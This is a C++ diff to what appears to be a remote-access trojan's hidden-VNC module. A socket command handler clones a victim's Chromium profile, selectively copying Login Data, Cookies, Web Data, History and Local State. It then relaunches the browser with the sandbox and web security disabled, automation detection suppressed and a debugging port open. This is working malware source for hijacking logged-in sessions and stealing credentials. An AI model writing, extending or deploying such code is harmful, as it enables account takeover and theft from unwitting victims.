@@ -1156,23 +1156,55 @@ static wstring GetEnvVar(const wstring& name) {
     return L"";
 }
 
-static bool CopyDirectory(const wstring& src, const wstring& dst) {
-    // SHFileOperation expects double-null terminated strings
-    vector<wchar_t> from(src.begin(), src.end());
-    from.push_back(L'\0');
-    from.push_back(L'\0');
+static bool CopyFileIfExists(const wstring& src, const wstring& dst) {
+    if (!PathFileExistsW(src.c_str())) return false;
+    // Create directory if not exists
+    wstring dir = dst;
+    PathRemoveFileSpecW(&dir[0]);
+    SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
+    return CopyFileW(src.c_str(), dst.c_str(), FALSE) != FALSE;
+}
 
-    vector<wchar_t> to(dst.begin(), dst.end());
-    to.push_back(L'\0');
-    to.push_back(L'\0');
+static void CopyProfileEssential(const wstring& srcRoot, const wstring& dstRoot) {
+    SHCreateDirectoryExW(NULL, dstRoot.c_str(), NULL);
 
-    SHFILEOPSTRUCTW fileOp = {0};
-    fileOp.wFunc = FO_COPY;
-    fileOp.pFrom = from.data();
-    fileOp.pTo = to.data();
-    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+    // 1. Copy Local State (Root)
+    CopyFileIfExists(srcRoot + L"\\Local State", dstRoot + L"\\Local State");
 
-    return SHFileOperationW(&fileOp) == 0;
+    // 2. Scan for Profiles (Default, Profile 1, etc.)
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW((srcRoot + L"\\*").c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                wstring name = fd.cFileName;
+                if (name == L"." || name == L"..") continue;
+
+                // Essential profile folders: Default or Profile X
+                if (name == L"Default" || name.find(L"Profile") == 0) {
+                    wstring srcP = srcRoot + L"\\" + name;
+                    wstring dstP = dstRoot + L"\\" + name;
+                    SHCreateDirectoryExW(NULL, dstP.c_str(), NULL);
+
+                    // Essential Files in Profile
+                    const wchar_t* files[] = {
+                        L"\\Preferences", L"\\Secure Preferences", L"\\Web Data",
+                        L"\\Login Data", L"\\Cookies", L"\\History", L"\\Top Sites",
+                        L"\\Bookmarks", L"\\Last Session", L"\\Last Tabs"
+                    };
+                    for (const auto& f : files) {
+                        CopyFileIfExists(srcP + f, dstP + f);
+                    }
+
+                    // Network/Cookies (Newer Chrome)
+                    SHCreateDirectoryExW(NULL, (dstP + L"\\Network").c_str(), NULL);
+                    CopyFileIfExists(srcP + L"\\Network\\Cookies", dstP + L"\\Network\\Cookies");
+                    CopyFileIfExists(srcP + L"\\Network\\Trust Tokens", dstP + L"\\Network\\Trust Tokens");
+                }
+            }
+        } while (FindNextFileW(hFind, &fd));
+        FindClose(hFind);
+    }
 }
 
 struct BrowserPaths {
@@ -1290,8 +1322,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name + L"_" + to_wstring(GetTickCount());
 
-                    // Use \* to copy contents, so clonePath becomes the User Data root
-                    CopyDirectory(bInfo.userData + L"\\*", clonePath);
+                    // Fast Selective Copy
+                    CopyProfileEssential(bInfo.userData, clonePath);
 
                     // Chromium check for lock files to prevent "Already in Use" dialogs
                     DeleteFileW((clonePath + L"\\SingletonLock").c_str());
@@ -1300,9 +1332,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
                     cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
-                                 L"\" --no-sandbox --test-type --disable-gpu --no-first-run --no-default-browser-check "
-                                 L"--disable-blink-features=AutomationControlled --disable-infobars "
-                                 L"--disable-features=IsolateOrigins,site-per-process --remote-debugging-port=0";
+                                 L"\" --no-sandbox --test-type --password-store=basic --disable-gpu --no-first-run "
+                                 L"--no-default-browser-check --disable-blink-features=AutomationControlled "
+                                 L"--allow-running-insecure-content --disable-web-security "
+                                 L"--disable-infobars --remote-debugging-port=0";
                 } else {
                     cmdLineStr = path;
                 }
